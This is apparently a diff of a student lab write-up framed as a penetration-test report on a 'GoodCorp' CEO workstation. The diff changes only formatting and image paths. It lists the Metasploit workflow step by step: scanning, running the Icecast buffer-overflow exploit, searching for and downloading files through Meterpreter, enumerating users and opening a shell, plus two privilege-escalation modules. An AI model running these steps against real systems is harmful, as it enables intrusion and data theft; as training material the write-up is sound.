@@ -1,4 +1,5 @@
 # Penetration_Test_Engagement
+
 In this activity, I played the role of an independent penetration tester hired by "GoodCorp Inc." to perform security tests against their CEO's workstation.
 
 ## GoodSecurity Penetration Report
@@ -13,181 +14,181 @@ When performing the internal penetration test, there were several alarming vulne
 
 ### 2.0 Findings
 
-Machine IP:
+**Machine IP:**
 
- 192.168.0.20
+192.168.0.20
 
-Hostname:
+**Hostname:**
 
- MSEDGEWIN10 (DVW10)
+MSEDGEWIN10 (DVW10)
 
-Vulnerability Exploited:
+**Vulnerability Exploited:**
 
- Icecast Header Overwrite
+Icecast Header Overwrite
 
- ![Icecast_Vulnerability](Screenshots/search_icecast_command.png)
+![Icecast_Vulnerability](Screenshots/search_icecast_command.png)
 
-Vulnerability Explanation:
+**Vulnerability Explanation:**
  
- The Icecast Header Overwrite vulnerability running on 192.168.0.20 Host allows a buffer overflow exploit that lets an attacker system gain remote control of the victim system by overwriting the memory on the system. The exploit writes past the end of a pointer array when receiving 32 HTTP headers. This allowed for a variety of remote actions, such as file discovery and download, key logging, screen capture, and privilege escalation to Administrator.
+The Icecast Header Overwrite vulnerability running on 192.168.0.20 Host allows a buffer overflow exploit that lets an attacker system gain remote control of the victim system by overwriting the memory on the system. The exploit writes past the end of a pointer array when receiving 32 HTTP headers. This allowed for a variety of remote actions, such as file discovery and download, key logging, screen capture, and privilege escalation to Administrator.
 
-Severity:
+**Severity:**
 
- The severity of this vulnerability is High, with a CVSS score of 7.5.
+The severity of this vulnerability is High, with a CVSS score of 7.5.
 
-Proof of Concept:
+**Proof of Concept:**
 
- Perform a service and version scan using Nmap to determine which services are up and running:
+Perform a service and version scan using Nmap to determine which services are up and running:
 
- -Run the Nmap command that performs a service and version scan against the target.
+-Run the Nmap command that performs a service and version scan against the target.
 
-  Answer: nmap -sV 192.168.0.20
+**Answer:** nmap -sV 192.168.0.20
 
-  ![nmap](Screenshots/nmap_command.png)
+![nmap](Screenshots/nmap_command.png)
 
- From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:
+From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:
 
- -Run the SearchSploit commands to show available Icecast exploits.
+-Run the SearchSploit commands to show available Icecast exploits.
 
-  Answer: searchsploit icecast
+**Answer:** searchsploit icecast
 
-  ![searchsploit_icecast](Screenshots/searchsploit_icecast_command.png)
+![searchsploit_icecast](Screenshots/searchsploit_icecast_command.png)
 
- Now that we know which exploits are available to us, let's start Metasploit:
+Now that we know which exploits are available to us, let's start Metasploit:
 
- -Run the command that starts Metasploit:
+-Run the command that starts Metasploit:
 
-  Answer: msfconsole
+**Answer:** msfconsole
 
-  ![msfconsole](Screenshots/msfconsole_command.png)
+![msfconsole](Screenshots/msfconsole_command.png)
  
- Search for the Icecast module and load it for use.
+Search for the Icecast module and load it for use.
 
- -Run the command to search for the Icecast module:
+-Run the command to search for the Icecast module:
 
-  Answer: search icecast
+**Answer:** search icecast
 
-  ![search_icecast](Screenshots/search_icecast_command.png)
+![search_icecast](Screenshots/search_icecast_command.png)
  
- -Run the command to use the Icecast module:
+-Run the command to use the Icecast module:
 
-  Answer: use 0
+**Answer:** use 0
 
-  ![use](Screenshots/use_0_command.png)
+![use](Screenshots/use_0_command.png)
  
- -Run the command that sets the RHOST:
+-Run the command that sets the RHOST:
 
-  Answer: set RHOST 192.168.0.20
+**Answer:** set RHOST 192.168.0.20
 
-  ![RHOST](Screenshots/use_rhost_command.png)
+![RHOST](Screenshots/use_rhost_command.png)
  
- -Run the command that runs the Icecast exploit.
+-Run the command that runs the Icecast exploit.
 
-  Answer: exploit
+**Answer:** exploit
 
-  ![exploit](Screenshots/exploit_command.png)
+![exploit](Screenshots/exploit_command.png)
  
- You should now have a Meterpreter session open.
+You should now have a Meterpreter session open.
 
- -Run the command that performs a search for the secretfile.txt on the target.
+-Run the command that performs a search for the secretfile.txt on the target.
 
-  Answer: search -f *secretfile*.txt
+**Answer:** search -f *secretfile*.txt
 
-  ![secretfile](secretfile_command.png)
+![secretfile](Screenshots/secretfile_command.png)
 
- -Run the command to performs a search for the recipe.txt on the target:
+-Run the command to performs a search for the recipe.txt on the target:
 
-  Answer: search -f *recipe*.txt
+**Answer:** search -f *recipe*.txt
 
-  ![recipe](Screenshots/recipe_command.png)
+![recipe](Screenshots/recipe_command.png)
 
- -Run the command that ex-filtrates the recipe*.txt file:
+-Run the command that ex-filtrates the recipe*.txt file:
 
-  Answer: download ‘c:\Users\IEUser\Documents\Drinks.recipe.txt’
+**Answer:** download ‘c:\Users\IEUser\Documents\Drinks.recipe.txt’
 
-  ![exfiltrate](Screenshots/exfiltrate_recipe_command.png)
+![exfiltrate](Screenshots/exfiltrate_recipe_command.png)
 
- Verify that you have successfully downloaded the file.
+Verify that you have successfully downloaded the file.
 
- -Verification:
+-**Verification:**
 
-  ![verification](Screenshots/verify_drinks.png) 
+![verification](Screenshots/verify_drinks.png) 
 
- You can also use Meterpreter's local exploit suggester to find possible exploits.
+You can also use Meterpreter's local exploit suggester to find possible exploits.
 
- -Run the command to use Meterpreter’s local exploit suggester.
+-Run the command to use Meterpreter’s local exploit suggester.
 
-  Answer: run post/multi/recon/local_exploit_suggester
+**Answer:** run post/multi/recon/local_exploit_suggester
 
-  ![exploit_suggestor](Screenshots/exfiltrate_recipe_command.png)
+![exploit_suggestor](Screenshots/exfiltrate_recipe_command.png)
 
- -Run a Meterpreter post script that enumerates all logged on users.
+-Run a Meterpreter post script that enumerates all logged on users.
 
-  Answer: run post/windows/gather/enum_logged_on_users
+**Answer:** run post/windows/gather/enum_logged_on_users
 
-  ![enum_users](Screenshots/logged_on_users_command.png)
+![enum_users](Screenshots/logged_on_users_command.png)
 
- -Run the command to open a Meterpreter shell and gather system information for the target.
+-Run the command to open a Meterpreter shell and gather system information for the target.
 
-  Answer: shell
+**Answer:** shell
 
-  ![shell](Screenshots/shell_command.png)
+![shell](Screenshots/shell_command.png)
 
- -Run the command that displays the target's computer system information:
+-Run the command that displays the target's computer system information:
 
-  Answer: systeminfo
+**Answer:** systeminfo
 
-  ![systeminfo](Screenshots/systeminfo_command.png)
+![systeminfo](Screenshots/systeminfo_command.png)
 
 ### Separate findings for each vulnerability can be found below:
 
-Machine IP:
+**Machine IP:**
 
- 192.168.0.20 Port 25
+192.168.0.20 Port 25
 
-Hostname:
+**Hostname:**
 
- MSEDGEWIN10 (DVW10)
+MSEDGEWIN10 (DVW10)
 
-Vulnerability Exploited:
+**Vulnerability Exploited:**
 
- windows/local/ikeext_service
+windows/local/ikeext_service
 
-Vulnerability Explanation:
+**Vulnerability Explanation:**
 
- The ikeext_service vulnerability utilizes a missing Dynamic-link library (DLL) in Microsoft’s operating system that runs as SYSTEM and starts automatically in default installations of select windows operating systems. This vulnerability can be used for privilege escalation under the SYSTEM account. It requires an insecure bin path to plant the DLL payload.
+The ikeext_service vulnerability utilizes a missing Dynamic-link library (DLL) in Microsoft’s operating system that runs as SYSTEM and starts automatically in default installations of select windows operating systems. This vulnerability can be used for privilege escalation under the SYSTEM account. It requires an insecure bin path to plant the DLL payload.
 
-Severity:
+**Severity:**
 
- The severity of this vulnerability is Medium, with a CVSS score of 6.0.
+The severity of this vulnerability is Medium, with a CVSS score of 6.0.
 
-Proof of Concept: 
+**Proof of Concept:** 
 
- ![ikeext_proof](Screenshots/ikeext_vulnerability.png)
+![ikeext_proof](Screenshots/ikeext_vulnerability.png)
 
-Machine IP:
+**Machine IP:**
 
- 192.168.0.20 Port 25
+192.168.0.20 Port 25
 
-Hostname:
+**Hostname:**
 
- MSEDGEWIN10 (DVW10)
+MSEDGEWIN10 (DVW10)
 
-Vulnerability Exploited:
+**Vulnerability Exploited:**
 
- windows/local/ms16_075_reflection
+windows/local/ms16_075_reflection
 
-Vulnerability Explanation:
+**Vulnerability Explanation:**
 
- The ms16_075_relfection vulnerability utilizes a reflection link between Distributed Component Object Model (DCOM) and Remote procedure call (RPC) that allows local users to use a crafted application to gain a SYSTEM handle for privilege escalation. The module does not start as SYSTEM by default. Once gaining a shell SYSTEM impersonation is possible.
+The ms16_075_relfection vulnerability utilizes a reflection link between Distributed Component Object Model (DCOM) and Remote procedure call (RPC) that allows local users to use a crafted application to gain a SYSTEM handle for privilege escalation. The module does not start as SYSTEM by default. Once gaining a shell SYSTEM impersonation is possible.
 
-Severity:
+**Severity:**
 
- The severity of this vulnerability is Medium, with a CVSS score of 6.9.
+The severity of this vulnerability is Medium, with a CVSS score of 6.9.
 
-Proof of Concept: 
+**Proof of Concept:** 
 
- ![ms16_proof](ms16_075_reflection_vulnerability.png)
+![ms16_proof](Screenshots/ms16_075_reflection_vulnerability.png)
 
 ### 3.0 Recommendations
 
